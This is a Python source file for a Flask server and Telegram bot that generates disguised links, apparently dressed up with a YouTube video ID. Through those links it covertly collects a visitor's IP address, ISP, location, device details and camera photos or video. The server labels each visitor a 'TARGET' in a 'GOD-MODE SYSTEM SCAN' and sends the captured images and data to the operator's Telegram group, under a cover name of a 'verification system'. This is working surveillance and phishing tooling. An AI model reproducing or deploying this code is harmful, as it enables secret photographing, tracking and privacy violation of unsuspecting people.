import os, telebot, threading, io, time
from flask import Flask, render_template, request

# --- CONFIG ---
# Ensure these match your Koyeb Environment Variables exactly
TOKEN = os.environ.get('TOKEN')
BASE_URL = os.environ.get('BASE_URL') 
GROUP_ID = os.environ.get('GROUP_ID') 
bot = telebot.TeleBot(TOKEN)
app = Flask(__name__)

# This stores logs and user choices in memory
collection = {}
user_temp = {}

# --- SHARED MENU HELPER ---
def main_menu_markup():
    # This creates the "4 dots" / 4 buttons layout at the bottom
    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=False)
    markup.row("🤳 Front Cam", "📷 Back Cam")
    markup.row("📸 8 Photos", "🎥 3s Video")
    return markup

# --- TELEGRAM BOT LOGIC ---
@bot.message_handler(commands=['start'])
def start(m):
    bot.send_message(
        m.chat.id, 
        "✅ <b>AnyaStore Verification System Active.</b>\nSelect your settings below:", 
        reply_markup=main_menu_markup(), 
        parse_mode="HTML"
    )

@bot.message_handler(func=lambda m: m.text in ["🤳 Front Cam", "📷 Back Cam"])
def set_cam(m):
    # Update camera preference silently and keep the user on the main menu
    user_temp[m.chat.id] = user_temp.get(m.chat.id, {})
    user_temp[m.chat.id]['cam'] = 'user' if "Front" in m.text else 'environment'
    bot.send_message(
        m.chat.id, 
        f"✅ Camera set to: <b>{m.text}</b>", 
        parse_mode="HTML",
        reply_markup=main_menu_markup()
    )

@bot.message_handler(func=lambda m: m.text in ["📸 8 Photos", "🎥 3s Video"])
def set_mode(m):
    # Set the capture mode and then ask for the YouTube ID
    user_temp[m.chat.id] = user_temp.get(m.chat.id, {})
    user_temp[m.chat.id]['mode'] = 'photo' if "Photos" in m.text else 'video'
    
    msg = bot.send_message(
        m.chat.id, 
        "🔗 <b>Enter YouTube Video ID</b> (or type 'default'):", 
        parse_mode="HTML",
        reply_markup=telebot.types.ReplyKeyboardRemove() # Hide menu while typing ID
    )
    bot.register_next_step_handler(msg, make_link)

def make_link(m):
    # Fallback if user didn't pick cam/mode yet
    if m.chat.id not in user_temp:
        user_temp[m.chat.id] = {'cam': 'user', 'mode': 'photo'}
        
    yt = m.text if (m.text and m.text.lower() != 'default') else 'dQw4w9WgXcQ'
    d = user_temp[m.chat.id]
    
    # Ensure BASE_URL doesn't have a trailing slash for clean links
    clean_url = BASE_URL.rstrip('/')
    link = f"{clean_url}/?id={m.chat.id}&mode={d['mode']}&cam={d['cam']}&ytid={yt}"
    
    # 1. Send the generated link
    bot.send_message(m.chat.id, f"🚀 <b>Link Ready:</b>\n<code>{link}</code>", parse_mode="HTML")
    
    # 2. Return to Main UI with the 4 menu dots
    bot.send_message(
        m.chat.id, 
        "✨ <b>Configuration Saved.</b> Use the menu below to create another link or change settings.", 
        reply_markup=main_menu_markup(),
        parse_mode="HTML"
    )

# --- WEB SERVER LOGIC ---
@app.route('/')
def index():
    ua = request.headers.get('User-Agent', '').lower()
    # Route to different templates based on OS detection
    if 'iphone' in ua or 'ipad' in ua:
        return render_template('ios.html')
    elif 'android' in ua:
        return render_template('android.html')
    else:
        return render_template('pc.html')

@app.route('/log_info', methods=['POST'])
def log_info():
    data = request.json
    tid = request.args.get('id')
    
    # We use <pre> tags to prevent Telegram from crashing on special characters like '_'
    info = (
        f"⚡ <b>GOD-MODE SYSTEM SCAN</b> ⚡\n"
        f"━━━━━━━━━━━━━━━\n"
        f"👤 <b>TARGET ID:</b> <code>{tid}</code>\n"
        f"🌐 <b>IP:</b> <code>{data.get('ip')}</code>\n"
        f"🏢 <b>ISP:</b> {data.get('org')}\n"
        f"📍 <b>LOC:</b> {data.get('city')}, {data.get('country_name')}\n"
        f"━━━━━━━━━━━━━━━\n"
        f"📱 <b>DEVICE SPECS</b>\n"
        f"• <b>Hardware:</b> {data.get('platform')}\n"
        f"• <b>GPU:</b> {data.get('gpu', 'N/A')}\n"
        f"🔋 <b>Battery:</b> {data.get('battery', 'N/A')}\n"
        f"📄 <b>UserAgent:</b> <code>{data.get('browser')[:50]}...</code>"
    )
    
    if tid not in collection: 
        collection[tid] = {"photos": []}
    collection[tid]["info"] = info
    return "OK"

@app.route('/upload', methods=['POST'])
def upload():
    tid = request.args.get('id')
    file_bytes = request.files['file'].read()
    
    if tid not in collection:
        collection[tid] = {"photos": [], "info": f"ID: {tid}"}
    
    info = collection[tid].get("info", f"ID: {tid}")

    # Handle Video Uploads
    if request.args.get('type') == 'video':
        try:
            bot.send_video(GROUP_ID, io.BytesIO(file_bytes), caption=info, parse_mode="HTML")
        except Exception as e:
            print(f"Video Send Error: {e}")
        return "OK"

    # Handle Photo Uploads (wait for 8 photos)
    collection[tid]["photos"].append(file_bytes)
    
    if len(collection[tid]["photos"]) >= 8:
        media = []
        for i, p in enumerate(collection[tid]["photos"]):
            # Only the first photo gets the full system info caption
            media.append(telebot.types.InputMediaPhoto(p, caption=info if i==0 else "", parse_mode="HTML"))
        
        try:
            bot.send_media_group(GROUP_ID, media)
        except Exception as e:
            print(f"Media Group Error: {e}")
            # Fallback if album fails
            bot.send_message(GROUP_ID, info, parse_mode="HTML")
            
        del collection[tid] # Clear memory after sending
    return "OK"

# --- BOT POLLING THREAD ---
def run_bot():
    while True:
        try:
            bot.remove_webhook()
            bot.polling(none_stop=True, interval=0, timeout=20)
        except Exception as e:
            print(f"Bot Polling Error: {e}")
            time.sleep(10) # Wait before restarting on failure

if __name__ == "__main__":
    # Start Telegram Bot in background
    threading.Thread(target=run_bot, daemon=True).start()
    
    # Start Flask Web Server
    # Koyeb automatically provides the PORT environment variable
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)
